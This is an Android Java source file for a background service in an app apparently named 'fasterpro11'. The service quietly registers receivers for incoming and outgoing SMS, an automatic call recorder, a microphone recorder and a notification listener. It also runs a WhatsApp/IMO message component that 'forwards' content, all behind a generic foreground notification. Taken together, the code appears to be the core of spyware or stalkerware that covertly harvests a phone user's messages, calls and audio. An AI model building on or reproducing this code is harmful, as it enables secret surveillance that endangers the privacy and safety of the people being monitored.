package com.example.fasterpro11;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    public static final String ACTION_MIC_RECORD = "com.example.fasterpro11.ACTION_MIC_RECORD";

    private SmsReceiver smsReceiver;
    private OutgoingSmsObserver outgoingSmsObserver;
    private NotificationListener notificationListener;
    private WhatsAppIMOMessengerContent messengerContent;
    private MicRecord micRecord;
    private CallRecorderAuto callRecorderAuto;
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "foreground_service_channel";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: Background service starting");

        try {
            messengerContent = new WhatsAppIMOMessengerContent();
            micRecord = new MicRecord(this);
            registerReceivers();

            startForeground(NOTIFICATION_ID, buildNotification());

            Log.d(TAG, "Service onCreate: Initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing service", e);
        }
    }

    private void registerReceivers() {
        Log.d(TAG, "registerReceivers: Registering receivers");
        try {
            smsReceiver = new SmsReceiver();
            IntentFilter smsFilter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
            registerReceiver(smsReceiver, smsFilter);
            Log.d(TAG, "registerReceivers: SMS receiver registered");

            outgoingSmsObserver = new OutgoingSmsObserver(new Handler(), this);
            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, outgoingSmsObserver);
            Log.d(TAG, "registerReceivers: Outgoing SMS observer registered");

            callRecorderAuto = new CallRecorderAuto();
            IntentFilter callRecorderFilter = new IntentFilter("android.intent.action.PHONE_STATE");
            registerReceiver(callRecorderAuto, callRecorderFilter);
            Log.d(TAG, "registerReceivers: Call recorder registered");

            notificationListener = new NotificationListener();
            enableNotificationListener();

            Log.d(TAG, "Receivers registered successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error registering receivers", e);
        }
    }

    private Notification buildNotification() {
        Log.d(TAG, "buildNotification: Building notification");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel();
                return new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Foreground Service")
                        .setContentText("Running in foreground")
                        .setSmallIcon(R.drawable.notification_icon)
                        .build();
            } else {
                return new Notification.Builder(this)
                        .setContentTitle("Foreground Service")
                        .setContentText("Running in foreground")
                        .setSmallIcon(R.drawable.notification_icon)
                        .build();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error building notification", e);
            return null;
        }
    }

    private void createNotificationChannel() {
        Log.d(TAG, "createNotificationChannel: Creating notification channel");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel serviceChannel = new NotificationChannel(
                        CHANNEL_ID,
                        "Foreground Service Channel",
                        NotificationManager.IMPORTANCE_DEFAULT
                );
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(serviceChannel);
                    Log.d(TAG, "createNotificationChannel: Channel created successfully");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error creating notification channel", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy: Stopping service");
        try {
            if (micRecord != null) {
                unregisterReceiver(micRecord);
                Log.d(TAG, "onDestroy: MicRecord receiver unregistered");
            }
            unregisterReceiver(callRecorderAuto);
            Log.d(TAG, "onDestroy: Call recorder unregistered");
            unregisterReceiver(smsReceiver);
            Log.d(TAG, "onDestroy: SMS receiver unregistered");
            getContentResolver().unregisterContentObserver(outgoingSmsObserver);
            Log.d(TAG, "onDestroy: Outgoing SMS observer unregistered");
            disableNotificationListener();

            if (messengerContent != null) {
                messengerContent.stopForwarding();
                messengerContent = null;
                Log.d(TAG, "onDestroy: Messenger content stopped forwarding");
            }

            // নতুন লগ বার্তা
            Log.d(TAG, "NotificationListener service destroyed");
            Log.d(TAG, "Service onDestroy: Receivers and observers stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping service", e);
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void enableNotificationListener() {
        Log.d(TAG, "enableNotificationListener: Enabling notification listener");
        try {
            ComponentName componentName = new ComponentName(this, NotificationListener.class);
            if (!isNotificationListenerEnabled(componentName)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "enableNotificationListener: Notification listener settings opened");
            } else {
                Log.d(TAG, "enableNotificationListener: Notification listener already enabled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error enabling notification listener", e);
        }
    }

    private void disableNotificationListener() {
        Log.d(TAG, "disableNotificationListener: Disabling notification listener");
        try {
            ComponentName componentName = new ComponentName(this, NotificationListener.class);
            if (isNotificationListenerEnabled(componentName)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "disableNotificationListener: Notification listener settings opened");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error disabling notification listener", e);
        }
    }

    private boolean isNotificationListenerEnabled(ComponentName componentName) {
        Log.d(TAG, "isNotificationListenerEnabled: Checking if notification listener is enabled");
        try {
            String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            boolean isEnabled = flat != null && flat.contains(componentName.flattenToString());
            Log.d(TAG, "isNotificationListenerEnabled: Notification listener is " + (isEnabled ? "enabled" : "disabled"));
            return isEnabled;
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener", e);
            return false;
        }
    }
}
